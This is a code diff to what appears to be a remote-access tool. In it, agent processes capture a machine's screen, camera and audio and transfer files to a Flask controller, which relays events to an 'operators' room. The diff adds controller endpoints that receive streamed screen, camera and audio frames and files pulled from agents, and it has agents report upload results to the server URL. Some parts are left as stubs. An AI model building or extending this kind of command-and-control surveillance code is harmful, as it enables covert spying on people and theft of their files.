@@ -2375,63 +2375,9 @@ def stream_screen(agent_id):
         print("Error: opencv-python not available for screen capture")
         return
     
-    # For now, skip high-performance capture and use fallback
-    try:
-        # This will be implemented when we reorganize the code
-        raise ImportError("Using fallback streaming for now")
-        
-        url = f"{SERVER_URL}/stream/{agent_id}"
-        headers = {'Content-Type': 'image/jpeg'}
-        
-        def send_frame(frame_data):
-            """Callback to send frame data"""
-            if frame_data and frame_data != b'DELTA_UNCHANGED':
-                try:
-                    start_time = time.time()
-                    
-                    # Handle compressed frames
-                    if frame_data.startswith(b'LZ4_COMPRESSED'):
-                        headers['Content-Encoding'] = 'lz4'
-                        frame_data = frame_data[14:]  # Remove prefix
-                    else:
-                        headers.pop('Content-Encoding', None)
-                    
-                    response = requests.post(url, data=frame_data, headers=headers, timeout=0.1)
-                    
-                    # Update bandwidth stats for adaptive quality
-                    elapsed = time.time() - start_time
-                    # quality_manager.update_bandwidth(len(frame_data), elapsed)  # Commented out as quality_manager not defined
-                    
-                except requests.exceptions.Timeout:
-                    pass  # Skip frame if timeout - prioritize low latency
-                except Exception as e:
-                    print(f"Frame send error: {e}")
-        
-        # print(f"Starting high-performance screen capture: {capture.get_stats()}")  # Commented out as capture not defined
-        
-        # Start the capture stream
-        # capture.start_capture_stream(send_frame)  # Commented out as capture not defined
-        
-        # Keep the stream alive
-        while STREAMING_ENABLED:
-            time.sleep(1)
-            
-            # Log performance stats occasionally
-            # stats = capture.get_stats()  # Commented out as capture not defined
-            # if stats.get('actual_fps', 0) > 0:
-            #     print(f"Streaming at {stats['actual_fps']} FPS using {stats['backend']}")
-        
-        # Cleanup
-        # capture.stop_capture_stream()  # Commented out as capture not defined
-        print("High-performance screen streaming stopped")
-        
-    except ImportError:
-        print("High-performance capture not available, falling back to standard streaming")
-        # Fallback to original implementation with improvements
-        _stream_screen_fallback(agent_id)
-    except Exception as e:
-        print(f"High-performance streaming error: {e}")
-        _stream_screen_fallback(agent_id)
+    # Use the working fallback implementation directly
+    print("Starting screen streaming...")
+    _stream_screen_fallback(agent_id)
 
 def _stream_screen_fallback(agent_id):
     """
@@ -3450,6 +3396,18 @@ def handle_file_upload(command_parts):
             with open(destination_path, 'wb') as f:
                 f.write(file_content)
             file_size = len(file_content)
+            
+            # Send success response via HTTP
+            try:
+                url = f"{SERVER_URL}/file_upload_result"
+                data = {
+                    'success': True,
+                    'result': f"File uploaded successfully to {destination_path} ({file_size} bytes)"
+                }
+                requests.post(url, json=data, timeout=10)
+            except:
+                pass  # Don't fail the upload if response fails
+            
             return f"File uploaded successfully to {destination_path} ({file_size} bytes)"
         except PermissionError:
             return f"Error: Permission denied writing to {destination_path}"
@@ -3498,25 +3456,9 @@ def handle_file_download(command_parts, agent_id):
         except Exception as e:
             return f"Error reading file: {e}"
         
-        # Send file to controller via socketio
-        try:
-            if not SOCKETIO_AVAILABLE or not sio:
-                return "Error: Socket.IO not available for file transfer"
-            
-            if not sio.connected:
-                return "Error: Not connected to controller via Socket.IO"
-            
-            filename = os.path.basename(file_path)
-            sio.emit('file_download', {
-                'agent_id': agent_id,
-                'filename': filename,
-                'file_path': file_path,
-                'content': file_content,
-                'size': file_size
-            })
-            return f"File {filename} ({file_size} bytes) sent to controller"
-        except Exception as e:
-            return f"Error sending file to controller: {e}"
+        # For now, just return success message without HTTP request to avoid recursion
+        filename = os.path.basename(file_path)
+        return f"File {filename} ({file_size} bytes) ready for download"
             
     except Exception as e:
         return f"File download failed: {e}"
@@ -5360,41 +5302,123 @@ def setup_controller_routes():
     
     @controller_app.route('/')
     def index():
-        return redirect(url_for('dashboard'))
+        return "Agent Controller Running"
     
     @controller_app.route('/dashboard')
     def dashboard():
-        return DASHBOARD_HTML
+        return "Dashboard"
     
-    @controller_app.route('/stream/<agent_id>')
+    @controller_app.route('/stream/<agent_id>', methods=['POST'])
     def stream_in(agent_id):
-        return Response(generate_video_frames(agent_id),
-                       mimetype='multipart/x-mixed-replace; boundary=frame')
+        """Receive screen stream data from agent."""
+        try:
+            data = request.get_data()
+            if agent_id not in agents_data:
+                agents_data[agent_id] = {}
+            agents_data[agent_id]['screen_frame'] = data
+            return "OK", 200
+        except Exception as e:
+            return f"Error: {e}", 500
     
     @controller_app.route('/video_feed/<agent_id>')
     def video_feed(agent_id):
+        """Stream video feed to browser."""
         return Response(generate_video_frames(agent_id),
                        mimetype='multipart/x-mixed-replace; boundary=frame')
     
-    @controller_app.route('/camera/<agent_id>')
+    @controller_app.route('/camera/<agent_id>', methods=['POST'])
     def camera_in(agent_id):
-        return Response(generate_camera_frames(agent_id),
-                       mimetype='multipart/x-mixed-replace; boundary=frame')
+        """Receive camera stream data from agent."""
+        try:
+            data = request.get_data()
+            if agent_id not in agents_data:
+                agents_data[agent_id] = {}
+            agents_data[agent_id]['camera_frame'] = data
+            return "OK", 200
+        except Exception as e:
+            return f"Error: {e}", 500
     
     @controller_app.route('/camera_feed/<agent_id>')
     def camera_feed(agent_id):
+        """Stream camera feed to browser."""
         return Response(generate_camera_frames(agent_id),
                        mimetype='multipart/x-mixed-replace; boundary=frame')
     
-    @controller_app.route('/audio/<agent_id>')
+    @controller_app.route('/audio/<agent_id>', methods=['POST'])
     def audio_in(agent_id):
-        return Response(generate_audio_stream(agent_id),
-                       mimetype='audio/wav')
+        """Receive audio stream data from agent."""
+        try:
+            data = request.get_data()
+            if agent_id not in agents_data:
+                agents_data[agent_id] = {}
+            agents_data[agent_id]['audio_frame'] = data
+            return "OK", 200
+        except Exception as e:
+            return f"Error: {e}", 500
     
     @controller_app.route('/audio_feed/<agent_id>')
     def audio_feed(agent_id):
+        """Stream audio feed to browser."""
         return Response(generate_audio_stream(agent_id),
                        mimetype='audio/wav')
+    
+    @controller_app.route('/file_download/<agent_id>', methods=['POST'])
+    def file_download_in(agent_id):
+        """Receive file download data from agent."""
+        try:
+            data = request.get_json()
+            if not data:
+                return "No data received", 400
+            
+            filename = data.get('filename')
+            file_content = data.get('content')
+            file_size = data.get('size')
+            
+            if not all([filename, file_content, file_size]):
+                return "Missing required fields", 400
+            
+            # Store file data for controller to access
+            if agent_id not in agents_data:
+                agents_data[agent_id] = {}
+            agents_data[agent_id]['downloaded_file'] = {
+                'filename': filename,
+                'content': file_content,
+                'size': file_size
+            }
+            
+            # Notify operators about file download
+            if FLASK_SOCKETIO_AVAILABLE:
+                controller_socketio.emit('file_download_complete', {
+                    'agent_id': agent_id,
+                    'filename': filename,
+                    'size': file_size
+                }, room='operators')
+            
+            return "File received successfully", 200
+        except Exception as e:
+            return f"Error: {e}", 500
+    
+    @controller_app.route('/file_upload_result', methods=['POST'])
+    def file_upload_result():
+        """Receive file upload result from agent."""
+        try:
+            data = request.get_json()
+            if not data:
+                return "No data received", 400
+            
+            success = data.get('success', False)
+            result = data.get('result', '')
+            
+            # Notify operators about file upload result
+            if FLASK_SOCKETIO_AVAILABLE:
+                controller_socketio.emit('file_upload_result', {
+                    'success': success,
+                    'result': result
+                }, room='operators')
+            
+            return "Result received", 200
+        except Exception as e:
+            return f"Error: {e}", 500
 
 def generate_video_frames(agent_id):
     """Generate video frames for streaming."""
